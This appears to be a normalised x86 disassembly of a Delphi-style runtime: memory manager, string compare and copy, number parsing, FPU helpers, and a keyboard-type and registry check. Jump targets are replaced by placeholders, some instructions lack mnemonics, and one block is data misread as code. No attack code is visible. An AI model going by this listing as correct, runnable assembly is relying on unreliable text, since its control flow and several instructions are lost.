mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401e50
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401f88
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401d5c
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401fd4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401f88
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401508
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401da8
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401e18
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401d2c
sub [ edi + 0x4 ] 0x4
sub_402060
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4018b4
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401fd4
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_40208c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_401944
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401fd4
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_4020c0
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_4020ec
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401c98
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401f00
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_402060
test al al
jne r-xdata
mov eax esi
call sub_4020c0
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_4021e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401af4
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_40235c
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401450
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_4020ec
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401458
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403a84
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403a84
jmp r-xdata
sub_402370
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_402502
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401af4
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401450
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401458
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403a84
jmp r-xdata
call sub_401f88
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401c98
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401f00
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401c98
sub_402514
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401f88
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401c98
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_40208c
test al al
je r-xdata
call sub_401c98
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401d5c
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401f00
jmp r-xdata
sub_4026ee
mov eax eax
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4027a1
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401af4
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_402514
test al al
je r-xdata
push rw-data
call sub_401450
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_4021e0
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4029b0
mov eax ebx
call sub_402370
retn
push rw-data
call sub_401458
sub_4027b4
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402910
sub_4027d4
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402910
sub_4027f4
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402910
mov [ ecx ] eax
mov al 0x2
jmp sub_402910
retn
mov [ ecx ] eax
retn
sub_402884
push ebx
push esi
call sub_406118
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_406118
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_406118
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4028c4
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_406118
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4028b8
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_40294c
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4029b0
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402a20
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_402a60
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_40293c
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402ab4
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_40293c
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_40293c
jmp r-xdata
sub_402b0c
push esi
push edi
mov edi eax
xor eax eax
mov al [ edi ]
mov esi edx
xor edx edx
mov dl [ esi ]
inc esi
add al dl
jb r-xdata
mov al cl
sub cl [ edi ]
jbe r-xdata
cmp al cl
ja r-xdata
pop edi
pop esi
retn
mov dl cl
jmp r-xdata
mov ecx edx
mov dl [ edi ]
mov [ edi ] al
inc edi
add edi edx
[ edi ] [ esi ]
sub_402b48
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4029b0
pop ebx
retn
mov ecx ebx
sub_402b64
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402be8
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402c58
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402c78
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402d58
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402d98
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e4b ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e4b ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402e4b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_403084
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_4030b4
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4013ac
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_403125
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4013b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4013a4
retn
sub_4031b0
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_403258
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_4032b0
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404a04
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_4032d0
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_4059e4
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_403300
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_403384
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_403394
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40338b
lea eax [ ebp - 0x8 ]
call sub_4059cc
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_4032d0
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4059e4
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_403394
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4033d8
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403478
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_403418
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403448
push eax
push ecx
mov eax [ eax ]
call sub_403418
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403f90
call [ rw-data ]
sub_403460
push esi
mov esi edx
mov eax [ eax ]
call sub_403418
mov eax esi
pop esi
